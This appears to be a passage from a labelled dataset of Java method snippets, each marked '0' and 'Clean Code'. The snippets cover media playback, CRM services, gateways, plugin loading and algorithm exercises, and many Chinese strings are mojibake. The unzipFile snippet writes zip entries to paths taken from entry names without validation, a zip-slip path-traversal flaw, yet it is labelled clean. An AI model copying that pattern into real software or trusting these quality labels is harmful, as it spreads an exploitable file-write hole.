    final Matcher matcher=numberPattern.matcher(screenInfo.substring(physicalSizeStartIndex + PHYSICAL_SIZE.length()));
    if (matcher.find()) {
      device.setDeviceWidth(Integer.valueOf(matcher.group()));
    }
    if (matcher.find()) {
      device.setDeviceHeight(Integer.valueOf(matcher.group()));
    }
  }
  int OverrideSizeStartIndex=screenInfo.indexOf(OVERRIDE_SIZE);
  if (OverrideSizeStartIndex > -1) {
    final Matcher matcher=numberPattern.matcher(screenInfo.substring(OverrideSizeStartIndex + OVERRIDE_SIZE.length()));
    if (matcher.find()) {
      device.setDeviceOverrideWidth(Integer.valueOf(matcher.group()));
    }
    if (matcher.find()) {
      device.setDeviceOverrideHeight(Integer.valueOf(matcher.group()));
    }
  }
  if ((device.getDeviceOverrideWidth() == 0 || device.getDeviceOverrideHeight() == 0) && device.getDeviceWidth() != 0 && device.getDeviceHeight() != 0) {
    device.setDeviceOverrideWidth(device.getDeviceWidth());
    device.setDeviceOverrideHeight(device.getDeviceHeight());
  }
}",0,Clean Code
"public static Path unzipFile(String zipFilePath) throws IOException {
  Path tmpDir=Files.createTempDirectory(""job"");
  String destDir=tmpDir.toString();
  FileInputStream fis;
  byte[] buffer=new byte[1024];
  try {
    fis=new FileInputStream(zipFilePath);
    ZipInputStream zis=new ZipInputStream(fis);
    ZipEntry ze=zis.getNextEntry();
    while (ze != null) {
      String fileName=ze.getName();
      File newFile=new File(destDir + File.separator + fileName);
      System.out.println(""Unzipping to "" + newFile.getAbsolutePath());
      new File(newFile.getParent()).mkdirs();
      FileOutputStream fos=new FileOutputStream(newFile);
      int len;
      while ((len=zis.read(buffer)) > 0) {
        fos.write(buffer,0,len);
      }
      fos.close();
      zis.closeEntry();
      ze=zis.getNextEntry();
    }
    zis.closeEntry();
    zis.close();
    fis.close();
  }
 catch (  IOException e) {
    e.printStackTrace();
  }
  return tmpDir;
}",0,Clean Code
"/** 
 * @param parameters 请求参数
 * @return
 * @Description：将请求参数转换为xml格式的string
 */
@SuppressWarnings(""rawtypes"") public static String getRequestXml(SortedMap<Object,Object> parameters){
  StringBuffer sb=new StringBuffer();
  sb.append(""<xml>"");
  parameters.forEach((k,v) -> {
    if (""attach"".equalsIgnoreCase((String)k) || ""body"".equalsIgnoreCase((String)k) || ""sign"".equalsIgnoreCase((String)k)) {
      sb.append(""<"" + k + "">""+ ""<![CDATA[""+ v+ ""]]></""+ k+ "">"");
    }
 else {
      sb.append(""<"" + k + "">""+ v+ ""</""+ k+ "">"");
    }
  }
);
  sb.append(""</xml>"");
  try {
    return sb.toString();
  }
 catch (  Exception e) {
    log.error(""map转化成xml异常："" + e);
  }
  return """";
}
",0,Clean Code
"public List<Select_options_itemContext> select_options_item(){
  return getRuleContexts(Select_options_itemContext.class);
}
public Select_options_itemContext select_options_item(int i){
  return getRuleContext(Select_options_itemContext.class,i);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@63cd017e",0,Clean Code
"public static final boolean convertValueToBoolean(CharSequence value,boolean defaultValue){
  boolean result=false;
  if (null == value)   return defaultValue;
  if (value.equals(""1"") || value.equals(""true"") || value.equals(""TRUE""))   result=true;
  return result;
}",0,Clean Code
"@Override public ResponseModel get(CaptchaVO captchaVO){
  ResponseModel r=super.get(captchaVO);
  if (!validatedReq(r)) {
    return r;
  }
  BufferedImage originalImage=ImageUtils.getOriginal();
  if (null == originalImage) {
    logger.error(""婊戝姩搴曞浘鏈垵濮嬪寲鎴愬姛锛岃妫�鏌ヨ矾寰�"");
    return ResponseModel.errorMsg(RepCodeEnum.API_CAPTCHA_BASEMAP_NULL);
  }
  Graphics backgroundGraphics=originalImage.getGraphics();
  int width=originalImage.getWidth();
  int height=originalImage.getHeight();
  backgroundGraphics.setFont(waterMarkFont);
  backgroundGraphics.setColor(Color.white);
  backgroundGraphics.drawString(waterMark,width - getEnOrChLength(waterMark),height - (HAN_ZI_SIZE / 2) + 7);
  String jigsawImageBase64=ImageUtils.getslidingBlock();
  BufferedImage jigsawImage=ImageUtils.getBase64StrToImage(jigsawImageBase64);
  if (null == jigsawImage) {
    logger.error(""婊戝姩搴曞浘鏈垵濮嬪寲鎴愬姛锛岃妫�鏌ヨ矾寰�"");
    return ResponseModel.errorMsg(RepCodeEnum.API_CAPTCHA_BASEMAP_NULL);
  }
  CaptchaVO captcha=pictureTemplatesCut(originalImage,jigsawImage,jigsawImageBase64);
  if (captcha == null || StringUtils.isBlank(captcha.getJigsawImageBase64()) || StringUtils.isBlank(captcha.getOriginalImageBase64())) {
    return ResponseModel.errorMsg(RepCodeEnum.API_CAPTCHA_ERROR);
  }
  return ResponseModel.successData(captcha);
}",0,Clean Code
"/** 
 * Subscribe jit notify callback to be invoked after target jit finished. 
 */
public void registerJITNotifyCallback(Object id,NotifyCallback notifyCallback){
  Preconditions.checkNotNull(id);
  try {
    lock();
    List<NotifyCallback> notifyCallbacks=hasJITResult.get(id);
    if (notifyCallbacks == null) {
      notifyCallback.onNotifyMissed();
    }
 else {
      notifyCallbacks.add(notifyCallback);
    }
  }
  finally {
    unlock();
  }
}
",0,Clean Code
"@Override public BasicResultVO dingDingMaterialUpload(MultipartFile file,String sendAccount,String fileType){
  OapiMediaUploadResponse rsp;
  try {
    DingDingWorkNoticeAccount account=accountUtils.getAccountById(Integer.valueOf(sendAccount),DingDingWorkNoticeAccount.class);
    String accessToken=accessTokenUtils.getAccessToken(ChannelType.DING_DING_WORK_NOTICE.getCode(),Integer.valueOf(sendAccount),account,false);
    DingTalkClient client=new DefaultDingTalkClient(SendChanelUrlConstant.DING_DING_UPLOAD_URL);
    OapiMediaUploadRequest req=new OapiMediaUploadRequest();
    FileItem item=new FileItem(new StringBuilder().append(IdUtil.fastSimpleUUID()).append(file.getOriginalFilename()).toString(),file.getInputStream());
    req.setMedia(item);
    req.setType(EnumUtil.getDescriptionByCode(Integer.valueOf(fileType),FileType.class));
    rsp=client.execute(req,accessToken);
    if (rsp.isSuccess()) {
      return new BasicResultVO(RespStatusEnum.SUCCESS,UploadResponseVo.builder().id(rsp.getMediaId()).build());
    }
    log.error(""MaterialService#dingDingMaterialUpload fail:{}"",rsp.getErrmsg());
  }
 catch (  Exception e) {
    log.error(""MaterialService#dingDingMaterialUpload fail:{}"",Throwables.getStackTraceAsString(e));
  }
  return BasicResultVO.fail(RespStatusEnum.SERVICE_ERROR.getMsg());
}
",0,Clean Code
"@Override public void addFocusables(ArrayList<View> views,int direction,int focusableMode){
  if (DEBUG)   Log.v(TAG,""addFocusables"");
  if (hasFocus() || getGrandChildCount() == 0 || !shouldPersistFocusFromDirection(direction)) {
    super.addFocusables(views,direction,focusableMode);
  }
 else {
    views.add(this);
  }
}",0,Clean Code
"private void updateParams(){
  if ((MessagesController.getInstance(currentAccount).getfileExperimentalParams || NekoConfig.enhancedFileLoader.Bool() && !forceSmallChunk)) {
    downloadChunkSizeBig=1024 * 512;
    maxDownloadRequests=8;
    maxDownloadRequestsBig=8;
  }
 else {
    downloadChunkSizeBig=1024 * 128;
    maxDownloadRequests=4;
    maxDownloadRequestsBig=4;
  }
  maxCdnParts=(int)(FileLoader.DEFAULT_MAX_FILE_SIZE / downloadChunkSizeBig);
}",0,Clean Code
"private int getFrequency(final String word,DictionaryGroup dictGroup){
  if (TextUtils.isEmpty(word)) {
    return Dictionary.NOT_A_PROBABILITY;
  }
  int maxFreq=Dictionary.NOT_A_PROBABILITY;
  for (  final String dictType : ALL_DICTIONARY_TYPES) {
    final Dictionary dictionary=dictGroup.getDict(dictType);
    if (dictionary == null)     continue;
    final int tempFreq=dictionary.getFrequency(word);
    if (tempFreq >= maxFreq) {
      maxFreq=tempFreq;
    }
  }
  return maxFreq;
}
",0,Clean Code
"/** 
 * Process a given  {@link Type} by iterating of its direct annotations, fields and the annotations onthem as well as matching methods, invoking the type and annotation registrar when needed. In case you need to perform a lookup on the type system to provide the types to process call  {@link #use(NativeContext)}<pre class=""code""> processor.use(context) .toProcessTypes((typeSystem) -&gt; { return typeSystem.findTypesAnnotated(""Ljavax/persistent/Entity;"", true) .stream() .map(typeSystem::resolveName); }) </pre>
 * @param domainType can be {@literal null}.
 * @param imageContext must not be {@literal null}.
 */
public void process(Type domainType,NativeContext imageContext){
  process(domainType,imageContext,new LinkedHashSet<>(),TraversalPath.newPath(domainType));
}
private void process(Type domainType,NativeContext imageContext,Set<Type> seen,TraversalPath path){
  if (domainType == null || (maxDepth != -1 && path.depth() > maxDepth)) {
    return;
  }
  if (!typeFilter.test(domainType,imageContext) || seen.contains(domainType)) {
    imageContext.log(String.format(componentLogName + "": skipping type %s %s."",domainType.getDottedName(),seen.contains(domainType) ? ""because it was already processed"" : ""because it was filtered out by the typeFilter""));
    return;
  }
  imageContext.log(String.format(componentLogName + "": processing type %s."",domainType.getDottedName()));
  seen.add(domainType);
  typeRegistrar.accept(domainType,DiscoveryContext.contextOf(path),imageContext);
  if (inspectionFilter.isExcluded(domainType)) {
    imageContext.log(String.format(componentLogName + "": skip field and method inspection for type %s."",domainType.getDottedName()));
    return;
  }
  processSignatureTypesOfType(domainType,imageContext,seen,path);
  processAnnotationsOnType(domainType,imageContext,seen,path);
  processConstructorsOfType(domainType,imageContext,seen,path);
  processFieldsOfType(domainType,imageContext,seen,path);
  processMethodsOfType(domainType,imageContext,seen,path);
}",0,Clean Code
"/** 
 * Loads a plugin
 * @param context Context
 * @param file    Plugin file
 */
@SuppressWarnings({""JavaReflectionMemberAccess"",""unchecked""}) public static void loadPlugin(Context context,File file){
  String fileName=file.getName().replace("".zip"","""");
  logger.info(""Loading plugin: "" + fileName);
  try {
    var loader=new PathClassLoader(file.getAbsolutePath(),context.getClassLoader());
    Plugin.Manifest manifest;
    try (var stream=loader.getResourceAsStream(""manifest.json"")){
      if (stream == null) {
        failedToLoad.put(file,""No manifest found"");
        logger.error(""Failed to load plugin "" + fileName + "": No manifest found"",null);
        return;
      }
      try (var reader=new InputStreamReader(stream)){
        manifest=GsonUtils.fromJson(GsonUtils.getGson(),reader,Plugin.Manifest.class);
      }
     }
     var name=manifest.name;
    var pluginClass=(Class<? extends Plugin>)loader.loadClass(manifest.pluginClassName);
    Patcher.addPatch(pluginClass.getDeclaredConstructor(),new PreHook(param -> {
      var plugin=(Plugin)param.thisObject;
      try {
        manifestField.set(plugin,manifest);
      }
 catch (      IllegalAccessException e) {
        logger.errorToast(""Failed to set manifest for "" + manifest.name);
        logger.error(e);
      }
    }
));
    var pluginInstance=pluginClass.newInstance();
    if (plugins.containsKey(name)) {
      logger.error(""Plugin with name "" + name + "" already exists"",null);
      return;
    }
    pluginInstance.__filename=fileName;
    if (pluginInstance.needsResources) {
      AssetManager assets=AssetManager.class.newInstance();
      Method addAssetPath=AssetManager.class.getMethod(""addAssetPath"",String.class);
      addAssetPath.invoke(assets,file.getAbsolutePath());
      pluginInstance.resources=new Resources(assets,context.getResources().getDisplayMetrics(),context.getResources().getConfiguration());
    }
    plugins.put(name,pluginInstance);
    classLoaders.put(loader,pluginInstance);
    pluginInstance.load(context);
  }
 catch (  Throwable e) {
    failedToLoad.put(file,e);
    logger.error(""Failed to load plugin "" + fileName + "":\n"",e);
  }
}
",0,Clean Code
"@Override public int hashCode(){
  int result=super.hashCode();
  result=31 * result + maxVideoWidth;
  result=31 * result + maxVideoHeight;
  result=31 * result + maxVideoFrameRate;
  result=31 * result + maxVideoBitrate;
  result=31 * result + (exceedVideoConstraintsIfNecessary ? 1 : 0);
  result=31 * result + (allowVideoMixedMimeTypeAdaptiveness ? 1 : 0);
  result=31 * result + (allowVideoNonSeamlessAdaptiveness ? 1 : 0);
  result=31 * result + (viewportOrientationMayChange ? 1 : 0);
  result=31 * result + viewportWidth;
  result=31 * result + viewportHeight;
  result=31 * result + maxAudioChannelCount;
  result=31 * result + maxAudioBitrate;
  result=31 * result + (exceedAudioConstraintsIfNecessary ? 1 : 0);
  result=31 * result + (allowAudioMixedMimeTypeAdaptiveness ? 1 : 0);
  result=31 * result + (allowAudioMixedSampleRateAdaptiveness ? 1 : 0);
  result=31 * result + (allowAudioMixedChannelCountAdaptiveness ? 1 : 0);
  result=31 * result + (forceLowestBitrate ? 1 : 0);
  result=31 * result + (forceHighestSupportedBitrate ? 1 : 0);
  result=31 * result + (exceedRendererCapabilitiesIfNecessary ? 1 : 0);
  result=31 * result + tunnelingAudioSessionId;
  return result;
}
@Override public int hashCode(){
  int hash=31 * groupIndex + Arrays.hashCode(tracks);
  hash=31 * hash + reason;
  return 31 * hash + data;
}
@Override public int hashCode(){
  int result=channelCount;
  result=31 * result + sampleRate;
  result=31 * result + (mimeType != null ? mimeType.hashCode() : 0);
  return result;
}",0,Clean Code
"/** 
 * Creates a RelOptPredicateList with only pulled-up predicates, no inferred predicates. <p>Use this for relational expressions other than joins.
 * @param pulledUpPredicates Predicates that apply to the rows returned by therelational expression
 */
public static RelOptPredicateList of(RexBuilder rexBuilder,Iterable<RexNode> pulledUpPredicates){
  ImmutableList<RexNode> pulledUpPredicatesList=ImmutableList.copyOf(pulledUpPredicates);
  if (pulledUpPredicatesList.isEmpty()) {
    return EMPTY;
  }
  return of(rexBuilder,pulledUpPredicatesList,EMPTY_LIST,EMPTY_LIST);
}
/** 
 * Creates a RelOptPredicateList for a join.
 * @param rexBuilder Rex builder
 * @param pulledUpPredicates Predicates that apply to the rows returned by therelational expression
 * @param leftInferredPredicates Predicates that were inferred from the rightinput
 * @param rightInferredPredicates Predicates that were inferred from the leftinput
 */
public static RelOptPredicateList of(RexBuilder rexBuilder,Iterable<RexNode> pulledUpPredicates,Iterable<RexNode> leftInferredPredicates,Iterable<RexNode> rightInferredPredicates){
  final ImmutableList<RexNode> pulledUpPredicatesList=ImmutableList.copyOf(pulledUpPredicates);
  final ImmutableList<RexNode> leftInferredPredicateList=ImmutableList.copyOf(leftInferredPredicates);
  final ImmutableList<RexNode> rightInferredPredicatesList=ImmutableList.copyOf(rightInferredPredicates);
  if (pulledUpPredicatesList.isEmpty() && leftInferredPredicateList.isEmpty() && rightInferredPredicatesList.isEmpty()) {
    return EMPTY;
  }
  final ImmutableMap<RexNode,RexNode> constantMap=RexUtil.predicateConstants(RexNode.class,rexBuilder,pulledUpPredicatesList);
  return new RelOptPredicateList(pulledUpPredicatesList,leftInferredPredicateList,rightInferredPredicatesList,constantMap);
}
",0,Clean Code
"public static int getValue(int[][][] dp,int i,int j,int step){
  if (i < 0 || i > 9 || j < 0 || j > 8) {
    return 0;
  }
  return dp[i][j][step];
}",0,Clean Code
"public List<Content> setDealStatus(Integer dealStatus,String id){
  String detail=""淇敼瀹㈡埛:%s鎴愪氦鐘舵��:"";
  if (dealStatus == 0) {
    detail+=""鏈垚浜ゃ��"";
  }
 else {
    detail+=""宸叉垚浜ゃ��"";
  }
  String finalDetail=detail;
  return StrUtil.splitTrim(id,Const.SEPARATOR).stream().map(customerId -> {
    String customerName=crmCustomerService.getCustomerName(Integer.valueOf(customerId));
    return new Content(customerName,String.format(finalDetail,customerName));
  }
).collect(Collectors.toList());
}",0,Clean Code
"/** 
 * Attempts to feed the given  {@code dataSpec} to {@code this.extractor}. Whenever the operation concludes (because of a thrown exception or because the operation finishes), the number of fed bytes is written to  {@code nextLoadPosition}.
 */
private void feedDataToExtractor(DataSource dataSource,DataSpec dataSpec,boolean dataIsEncrypted) throws IOException, InterruptedException {
  DataSpec loadDataSpec;
  boolean skipLoadedBytes;
  if (dataIsEncrypted) {
    loadDataSpec=dataSpec;
    skipLoadedBytes=nextLoadPosition != 0;
  }
 else {
    loadDataSpec=dataSpec.subrange(nextLoadPosition);
    skipLoadedBytes=false;
  }
  try {
    ExtractorInput input=prepareExtraction(dataSource,loadDataSpec);
    if (skipLoadedBytes) {
      input.skipFully(nextLoadPosition);
    }
    try {
      int result=Extractor.RESULT_CONTINUE;
      while (result == Extractor.RESULT_CONTINUE && !loadCanceled) {
        result=extractor.read(input,null);
      }
    }
  finally {
      nextLoadPosition=(int)(input.getPosition() - dataSpec.absoluteStreamPosition);
    }
  }
  finally {
    Util.closeQuietly(dataSource);
  }
}",0,Clean Code
"/** 
 * 鏍￠獙鏄惁鑳介��娆�
 * @param refundId 鏀粯閫�娆惧崟 id
 * @param walletPayNo 閽卞寘鏀粯 no
 */
private Long validateWalletCanRefund(Long refundId,String walletPayNo){
  PayWalletTransactionDO walletTransaction=walletTransactionService.getWalletTransactionByNo(walletPayNo);
  if (walletTransaction == null) {
    throw exception(WALLET_TRANSACTION_NOT_FOUND);
  }
  PayWalletTransactionDO refundTransaction=walletTransactionService.getWalletTransaction(String.valueOf(refundId),PAYMENT_REFUND);
  if (refundTransaction != null) {
    throw exception(WALLET_REFUND_EXIST);
  }
  return walletTransaction.getWalletId();
}
",0,Clean Code
"/** 
 * Gets the translation provider for workspace pages.
 */
public PageTranslationProvider getWorkspacePageTranslationProvider(Launcher launcher){
  if (!(this == SPRING_LOADED || this == EDIT_MODE) || !launcher.getDeviceProfile().isTwoPanels) {
    return DEFAULT_PAGE_TRANSLATION_PROVIDER;
  }
  final float quarterPageSpacing=launcher.getWorkspace().getPageSpacing() / 4f;
  return new PageTranslationProvider(DECELERATE_2){
    @Override public float getPageTranslation(    int pageIndex){
      boolean isRtl=launcher.getWorkspace().mIsRtl;
      boolean isFirstPage=pageIndex % 2 == 0;
      return ((isFirstPage && !isRtl) || (!isFirstPage && isRtl)) ? -quarterPageSpacing : quarterPageSpacing;
    }
  }
;
}",0,Clean Code
"@Override public void invoke(PcodeOp pcode,AbsEnv inOutEnv,AbsEnv tmpEnv,Context context,Function callFunc){
  ALoc retALoc=getReturnALoc(callFunc,false);
  if (retALoc == null) {
    return;
  }
  KSet ptrKSet=getParamKSet(callFunc,0,inOutEnv);
  if (ptrKSet.isTop()) {
    inOutEnv.set(retALoc,ptrKSet,true);
    return;
  }
  long taints=0;
  for (  AbsVal ptr : ptrKSet) {
    ALoc tmp=ALoc.getALoc(ptr.getRegion(),ptr.getValue(),1);
    Entry<ALoc,KSet> entry=inOutEnv.getOverlapEntry(tmp);
    if (entry != null && entry.getValue().isTop() && entry.getValue().isTaint()) {
      taints|=entry.getValue().getTaints();
    }
  }
  inOutEnv.set(retALoc,KSet.getTop(taints),true);
}",0,Clean Code
"/** 
 * Initializes the wrapper for loading a chunk.
 * @param chunkUid The chunk's uid.
 * @param shouldSpliceIn Whether the samples parsed from the chunk should be spliced into anysamples already queued to the wrapper.
 * @param reusingExtractor Whether the extractor for the chunk has already been used for precedingchunks.
 */
public void init(int chunkUid,boolean shouldSpliceIn,boolean reusingExtractor){
  if (!reusingExtractor) {
    sampleQueueMappingDoneByType.clear();
  }
  this.chunkUid=chunkUid;
  for (  SampleQueue sampleQueue : sampleQueues) {
    sampleQueue.sourceId(chunkUid);
  }
  if (shouldSpliceIn) {
    for (    SampleQueue sampleQueue : sampleQueues) {
      sampleQueue.splice();
    }
  }
}
",0,Clean Code
"/** 
 * 浣跨敤澶氫釜妯″紡锛岄伩鍏峱ost妯″紡绛塩atch涓嶄綇鐨勯棶棰�
 * @param exchange {@link ServerWebExchange}
 * @return result
 */
@RequestMapping public TeslaGatewayResult fallBack(ServerWebExchange exchange){
  Throwable exception=exchange.getAttribute(ServerWebExchangeUtils.CIRCUITBREAKER_EXECUTION_EXCEPTION_ATTR);
  HttpStatus status=HttpStatus.SERVICE_UNAVAILABLE;
  String message=HttpStatus.SERVICE_UNAVAILABLE.getReasonPhrase();
  if (exception != null) {
    exchange.getResponse().setStatusCode(HttpStatus.SERVICE_UNAVAILABLE);
    status=HttpStatus.SERVICE_UNAVAILABLE;
    message=""service is not available, please try again later. "" + Optional.ofNullable(exception.getLocalizedMessage()).orElse(StringUtils.EMPTY);
    exchange.getRequest().getId();
  }
  log.warn(""actionName=fallback||requestId={}||status={}||message={}"",exchange.getRequest().getId(),status,message,exception);
  exchange.getResponse().setStatusCode(status);
  return TeslaGatewayResult.builder().message(message).path(exchange.getRequest().getPath().value()).status(status.value()).timestamp(new Date()).requestId(exchange.getRequest().getId()).from(TeslaGatewayResult.GATEWAY_FLAG).build();
}
",0,Clean Code
"public static int c3(int n){
  if (n < 1) {
    return 0;
  }
  if (n == 1 || n == 2 || n == 3) {
    return n;
  }
  int[][] base={{1,1,0},{0,0,1},{1,0,0}};
  int[][] res=matrixPower(base,n - 3);
  return 3 * res[0][0] + 2 * res[1][0] + res[2][0];
}",0,Clean Code
"public static int process(int x,int y,int rest,int a,int b){
  if (x < 0 || x > 9 || y < 0 || y > 8) {
    return 0;
  }
  if (rest == 0) {
    return (x == a && y == b) ? 1 : 0;
  }
  int ways=process(x + 2,y + 1,rest - 1,a,b);
  ways+=process(x + 1,y + 2,rest - 1,a,b);
  ways+=process(x - 1,y + 2,rest - 1,a,b);
  ways+=process(x - 2,y + 1,rest - 1,a,b);
  ways+=process(x - 2,y - 1,rest - 1,a,b);
  ways+=process(x - 1,y - 2,rest - 1,a,b);
  ways+=process(x + 1,y - 2,rest - 1,a,b);
  ways+=process(x + 2,y - 1,rest - 1,a,b);
  return ways;
}",0,Clean Code
"public static Mono<ParsedEmailTemplate> convert(EmailTemplate template,Map<String,Object> context){
  return template.getSendTo(context).flatMapMany(Flux::fromIterable).map(receiver -> template.render(receiver,context)).collectList().map(sendToList -> {
    String subject=template.getSubject();
    String text=template.getText();
    if (CollectionUtils.isEmpty(sendToList) || ObjectUtils.isEmpty(subject) || ObjectUtils.isEmpty(text)) {
      throw new BusinessException(""妯℃澘鍐呭閿欒锛宻endTo, text 鎴栬�� subject 涓嶈兘涓虹┖."");
    }
    String sendText=template.render(text,context);
    List<EmailTemplate.Attachment> tempAttachments=template.getAttachments();
    Map<String,String> attachments=new LinkedHashMap<>();
    if (tempAttachments != null) {
      int index=0;
      for (      EmailTemplate.Attachment tempAttachment : tempAttachments) {
        index++;
        String name=template.render(tempAttachment.getName(),context);
        String location=template.get(tempAttachment.getLocation(),EmailTemplate.Attachment.locationKey(index),context);
        attachments.put(name,location);
      }
    }
    Map<String,String> images=new HashMap<>();
    sendText=extractSendTextImage(sendText,images);
    return ParsedEmailTemplate.builder().attachments(attachments).images(images).text(sendText).subject(template.render(subject,context)).sendTo(sendToList).build();
  }
);
}",0,Clean Code
"@Test public void clientShouldBeAbleToSendMessageToSingleApp(){
  WebSocketClient webSocketUserClient=new WebSocketClient(port,createClientTokenCredentials(USER_TOKEN));
  try {
    assertConnected(webSocketUserClient);
    WebSocketClient webSocketAppClient1=null;
    WebSocketClient webSocketAppClient2=null;
    try {
      webSocketAppClient1=new WebSocketClient(port,createAppCredentials(API_KEY,""123""));
      assertConnected(webSocketAppClient1);
      webSocketAppClient2=new WebSocketClient(port,createAppCredentials(API_KEY,""456""));
      assertConnected(webSocketAppClient2);
      TestRequest message=new TestRequest(Arrays.asList(""123""));
      webSocketUserClient.send(message);
      TestRequest app1Message=webSocketAppClient1.read(TestRequest.class,WAIT_SECS,TimeUnit.SECONDS);
      TestRequest app2Message=webSocketAppClient2.read(TestRequest.class,WAIT_SECS,TimeUnit.SECONDS);
      assertThat(app1Message,is(message));
      assertThat(app2Message,is(IsNull.nullValue()));
    }
  finally {
      if (webSocketAppClient1 != null) {
        webSocketAppClient1.close();
      }
      if (webSocketAppClient2 != null) {
        webSocketAppClient2.close();
      }
    }
  }
  finally {
    webSocketUserClient.close();
  }
}",0,Clean Code
"@Nonnull @Override protected List<VariableDefinition> getEmbeddedVariables(){
  if (toAllUser || StringUtils.hasText(userIdList) || StringUtils.hasText(departmentIdList)) {
    return Collections.emptyList();
  }
  List<VariableDefinition> variables=new ArrayList<>(2);
  variables.add(VariableDefinition.builder().id(USER_ID_LIST_KEY).name(""鏀朵俊浜�"").expand(NotifyVariableBusinessConstant.businessId,NotifyVariableBusinessConstant.NotifyVariableBusinessTypes.userType).type(StringType.ID).build());
  variables.add(VariableDefinition.builder().id(DEPARTMENT_ID_LIST_KEY).name(""鏀朵俊浜洪儴闂�"").expand(NotifyVariableBusinessConstant.businessId,NotifyVariableBusinessConstant.NotifyVariableBusinessTypes.orgType).type(StringType.ID).build());
  return variables;
}",0,Clean Code
"void stopSeek(boolean cancelled){
  if (!mInSeek) {
    return;
  }
  mInSeek=false;
  mSeekClient.onSeekFinished(cancelled);
  if (mSeekDataProvider != null) {
    mSeekDataProvider.reset();
  }
  mThumbHeroIndex=-1;
  mThumbsBar.clearThumbBitmaps();
  mSeekDataProvider=null;
  mPositions=null;
  mPositionsLength=0;
  mControlsVh.view.setVisibility(View.VISIBLE);
  mSecondaryControlsVh.view.setVisibility(View.VISIBLE);
  mDescriptionViewHolder.view.setVisibility(View.VISIBLE);
  mThumbsBar.setVisibility(View.INVISIBLE);
}",0,Clean Code
"/** 
 * 鏂板娲诲姩璁板綍
 * @param type           type
 * @param activityEnum   绫诲瀷
 * @param activityTypeId 绫诲瀷ID
 * @param businessChange 鍟嗘満鍙樺姩
 */
@Override public void addActivity(Integer type,CrmActivityEnum activityEnum,Integer activityTypeId,String businessChange){
  String content="""";
  if (type == 2) {
    content=""鍒涘缓浜�"" + activityEnum.getRemarks() + "": "";
  }
 else   if (type == 3) {
    content=businessChange;
  }
  CrmActivity crmActivity=new CrmActivity();
  crmActivity.setType(type);
  crmActivity.setActivityType(activityEnum.getType());
  crmActivity.setActivityTypeId(activityTypeId);
  crmActivity.setContent(content);
  crmActivity.setCreateUserId(UserUtil.getUserId());
  crmActivity.setCreateTime(new Date());
  save(crmActivity);
}
/** 
 * 鏂板娲诲姩璁板綍
 * @param type           type
 * @param activityEnum   绫诲瀷
 * @param activityTypeId 绫诲瀷ID
 */
@Override public void addActivity(Integer type,CrmActivityEnum activityEnum,Integer activityTypeId){
  addActivity(type,activityEnum,activityTypeId,"""");
}",0,Clean Code
"private <J2 extends J>JRightPadded<J2> minimumLines(JRightPadded<J2> tree,int min){
  return tree.withElement(minimumLines(tree.getElement(),min));
}
private <J2 extends J>J2 minimumLines(J2 tree,int min){
  return tree.withPrefix(minimumLines(tree.getPrefix(),min));
}
private Space minimumLines(Space prefix,int min){
  if (min == 0) {
    return prefix;
  }
  if (prefix.getComments().isEmpty() || prefix.getWhitespace().contains(""\n"") || prefix.getComments().get(0) instanceof Javadoc|| (prefix.getComments().get(0).isMultiline() && prefix.getComments().get(0).printComment(getCursor()).contains(""\n""))) {
    return prefix.withWhitespace(minimumLines(prefix.getWhitespace(),min));
  }
  return prefix.withComments(ListUtils.map(prefix.getComments(),(i,c) -> i == 0 ? c.withSuffix(minimumLines(c.getSuffix(),min)) : c));
}
public static String minimumLines(String whitespace,int min){
  if (min == 0) {
    return whitespace;
  }
  String minWhitespace=whitespace;
  for (int i=0; i < min - getNewLineCount(whitespace) + 1; i++) {
    minWhitespace=""\n"" + minWhitespace;
  }
  return minWhitespace;
}",0,Clean Code
"public static String getCookieValue(ServerHttpRequest request,String key){
  return getCookieValue(request,key,StringUtils.EMPTY);
}
public static String getCookieValue(ServerHttpRequest request,String key,String defaultValue){
  HttpCookie cookie=request.getCookies().getFirst(key);
  if (cookie == null) {
    return defaultValue;
  }
  return cookie.getValue();
}
public static String getCookieValue(HttpRequest request,String key){
  String first=request.getHeaders().getFirst(HttpHeaders.COOKIE);
  if (StringUtils.isEmpty(first)) {
    return StringUtils.EMPTY;
  }
  String[] cookieArray=StringUtils.split(first,"";"");
  for (  String cookieItem : cookieArray) {
    String[] cookieKv=StringUtils.split(cookieItem,""="");
    if (cookieKv != null && cookieKv.length == 2 && StringUtils.equals(cookieKv[0],key)) {
      return cookieKv[1];
    }
  }
  return StringUtils.EMPTY;
}",0,Clean Code
"@Override public void didFailedLoadingFile(FileLoadOperation operation,int reason){
  loadOperationPathsUI.remove(fileName);
  checkDownloadQueue(operation,operation.getQueue());
  if (getDelegate() != null) {
    delegate.fileDidFailedLoad(fileName,reason);
  }
  if (document != null && parentObject instanceof MessageObject && reason == 0) {
    getDownloadController().onDownloadFail((MessageObject)parentObject,reason);
  }
 else   if (reason == -1) {
    LaunchActivity.checkFreeDiscSpaceStatic(2);
  }
}",0,Clean Code
"public static <T>T downloadStringCached(String url,String cacheName,ParseCallback<T> parseCallback) throws IOException, ParseException {
  File cacheDestination=new File(Tools.DIR_CACHE,""string_cache/"" + cacheName);
  if (cacheDestination.isFile() && cacheDestination.canRead() && System.currentTimeMillis() < (cacheDestination.lastModified() + 86400000)) {
    try {
      String cachedString=Tools.read(new FileInputStream(cacheDestination));
      return parseCallback.process(cachedString);
    }
 catch (    IOException e) {
      Log.i(""DownloadUtils"",""Failed to read the cached file"",e);
    }
catch (    ParseException e) {
      Log.i(""DownloadUtils"",""Failed to parse the cached file"",e);
    }
  }
  String urlContent=DownloadUtils.downloadString(url);
  T parseResult=parseCallback.process(urlContent);
  boolean tryWriteCache;
  if (cacheDestination.exists()) {
    tryWriteCache=cacheDestination.canWrite();
  }
 else {
    tryWriteCache=FileUtils.ensureParentDirectorySilently(cacheDestination);
  }
  if (tryWriteCache)   try {
    Tools.write(cacheDestination.getAbsolutePath(),urlContent);
  }
 catch (  IOException e) {
    Log.i(""DownloadUtils"",""Failed to cache the string"",e);
  }
  return parseResult;
}",0,Clean Code
"public static Node midOrUpMidNode(Node head){
  if (head == null || head.next == null || head.next.next == null) {
    return head;
  }
  Node slow=head.next;
  Node fast=head.next.next;
  while (fast.next != null && fast.next.next != null) {
    slow=slow.next;
    fast=fast.next.next;
  }
  return slow;
}
",0,Clean Code
"@Override public long selectTracks(TrackSelection[] selections,boolean[] mayRetainStreamFlags,SampleStream[] streams,boolean[] streamResetFlags,long positionUs){
  for (int i=0; i < selections.length; i++) {
    if (streams[i] != null && (selections[i] == null || !mayRetainStreamFlags[i])) {
      sampleStreams.remove(streams[i]);
      streams[i]=null;
    }
    if (streams[i] == null && selections[i] != null) {
